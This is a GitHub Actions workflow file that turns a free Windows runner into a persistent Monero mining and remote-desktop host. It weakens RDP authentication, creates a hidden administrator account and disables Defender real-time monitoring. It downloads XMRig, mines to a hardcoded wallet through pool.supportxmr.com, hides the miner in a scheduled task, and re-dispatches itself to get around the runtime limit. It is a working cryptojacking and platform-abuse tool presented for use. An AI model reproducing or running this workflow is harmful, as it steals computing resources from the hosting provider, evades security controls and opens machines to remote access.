name: RDP-Miner-v3-NoPAT

on:
  workflow_dispatch:
  push:
    branches: [ main ]

jobs:
  build:
    runs-on: windows-latest
    timeout-minutes: 360        # 6 h GitHub hard ceiling (free)

    steps:
      # 1. Kill Windows session timeouts forever (registry)
      - name: Remove session limits
        shell: pwsh
        run: |
          $reg = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services"
          New-Item -Path $reg -Force | Out-Null
          Set-ItemProperty -Path $reg -Name MaxConnectionTime      -Value 0 -Type DWord -Force
          Set-ItemProperty -Path $reg -Name MaxIdleTime            -Value 0 -Type DWord -Force
          Set-ItemProperty -Path $reg -Name MaxDisconnectionTime   -Value 0 -Type DWord -Force
          gpupdate /force

      # 2. Core RDP enable + firewall
      - name: Configure RDP
        shell: pwsh
        run: |
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
          netsh advfirewall firewall delete rule name="RDP-Tailscale" 2>$null
          netsh advfirewall firewall add rule name="RDP-Tailscale" dir=in action=allow protocol=TCP localport=3389
          Restart-Service TermService -Force

      # 3. Create / re-create RDP user
      - name: Create RDP user
        shell: pwsh
        run: |
          Add-Type -AssemblyName System.Security
          $charSet = @{Upper=[char[]](65..90);Lower=[char[]](97..122);Number=[char[]](48..57);Special=([char[]](33..47)+[char[]](58..64)+[char[]](91..96)+[char[]](123..126))}
          $rawPassword = @(); 1..4 | % { $rawPassword += $charSet.Upper | Get-Random }
          1..4 | % { $rawPassword += $charSet.Lower | Get-Random }; 1..4 | % { $rawPassword += $charSet.Number | Get-Random }
          1..4 | % { $rawPassword += $charSet.Special | Get-Random }
          $password = -join ($rawPassword | Sort-Object { Get-Random })
          $secPass = ConvertTo-SecureString $password -AsPlainText -Force
          if (Get-LocalUser -Name "RDP" -ErrorAction SilentlyContinue) { Remove-LocalUser -Name "RDP" }
          New-LocalUser -Name "RDP" -Password $secPass -AccountNeverExpires -PasswordNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"
          Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
          echo "RDP_PASSWORD=$password" >> $env:GITHUB_ENV

      # 4. Install & connect Tailscale
      - name: Install Tailscale
        shell: pwsh
        run: |
          $tsUrl = "https://pkgs.tailscale.com/stable/tailscale-setup-1.82.0-amd64.msi"
          $msi   = "$env:TEMP\tailscale.msi"
          Invoke-WebRequest -Uri $tsUrl -OutFile $msi -UseBasicParsing
          Start-Process msiexec.exe -Wait -NoNewWindow -ArgumentList "/i `"$msi`" /quiet /norestart"
          Remove-Item $msi -Force
      - name: Connect Tailscale
        shell: pwsh
        run: |
          & "$env:ProgramFiles\Tailscale\tailscale.exe" up --authkey=${{ secrets.TAILSCALE_AUTH_KEY }} `
                               --hostname=gh-runner-$env:GITHUB_RUN_ID --accept-routes
          $ip = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
          echo "TAILSCALE_IP=$ip" >> $env:GITHUB_ENV

      # 5. Download / install / start XMRig  (survives reboot)
      - name: Launch & persist XMRig miner
        shell: pwsh
        run: |
          $wallet = "45y6ZGMXwSLdgioMFmPovte3dGiwYNuF9eNNU8gXP5F86sPkgiBsdemZU4M2DsUE7fd7eCSbHHcwiUCgi4RvxUQwBW1cBws"
          Write-Host "Starting Monero Miner..." -ForegroundColor Green
          Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

          # clean old files
          $zip  = "$env:TEMP\xmrig.zip"
          $dir  = "$env:USERPROFILE\Desktop\xmrig"
          Remove-Item $zip,$dir -Recurse -Force -ErrorAction SilentlyContinue

          # download & unpack
          $url  = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-gcc-win64.zip"
          Invoke-WebRequest -Uri $url -OutFile $zip -UseBasicParsing
          Expand-Archive -Path $zip -DestinationPath $dir -Force
          Set-Location "$dir\xmrig-6.21.0"

          $worker = "RDP-$(Get-Random -Max 9999)"
          $args   = "-o pool.supportxmr.com:443 -u $wallet -p $worker -k --tls --cpu-max-threads-hint=100"

          # start NOW
          Start-Process ".\xmrig.exe" -ArgumentList $args -WindowStyle Minimized

          # build the command line safely (YAML-friendly)
          $cmd = "Set-MpPreference -DisableRealtimeMonitoring `$true -ErrorAction SilentlyContinue; & '$dir\xmrig-6.21.0\xmrig.exe' $args"

          # register ScheduledTask (survives reboot) and START IT
          $action  = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command & {$cmd}"
          $trigger = New-ScheduledTaskTrigger -AtLogon
          $set     = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
          Register-ScheduledTask -TaskName "XMRigMiner" -Action $action -Trigger $trigger -Settings $set -Force -RunLevel Highest
          Start-ScheduledTask -TaskName "XMRigMiner"

          Write-Host "Miner active + registered for reboot/logon – no login required." -ForegroundColor Yellow

      # 6. Live hash-rate monitor
      - name: Miner progress monitor
        shell: pwsh
        run: |
          while ($true) {
            $proc = Get-Process -Name "xmrig" -ErrorAction SilentlyContinue
            if ($proc) {
              $hash = try { (Get-Content "$env:USERPROFILE\Desktop\xmrig\xmrig-6.21.0\log.txt" -Tail 1 -ErrorAction SilentlyContinue) } catch { "" }
              Write-Host "[$(Get-Date -f 'yyyy-MM-dd HH:mm:ss')]  xmrig.exe running  –  last log line: $hash"
            } else {
              Write-Host "[$(Get-Date -f 'yyyy-MM-dd HH:mm:ss')]  xmrig.exe NOT running – restarting ScheduledTask..." -ForegroundColor Red
              Start-ScheduledTask -TaskName "XMRigMiner"
            }
            Start-Sleep 30
          }

      # 7. Auto-restart before GitHub cancels (no PAT needed)
      - name: Auto-restart workflow
        if: always()
        shell: pwsh
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}   # built-in token is enough
        run: |
          # Settings → Actions → General → CHECK "Read and write permissions"
          Start-Sleep (5*3600 + 15*60)   # 5 h 15 m – leaves 45 min buffer
          gh api repos/${{ github.repository }}/actions/workflows/${{ github.workflow }}/dispatches `
             --field ref='${{ github.ref }}'
          Write-Host "Next run queued—this job ends in ~45 min."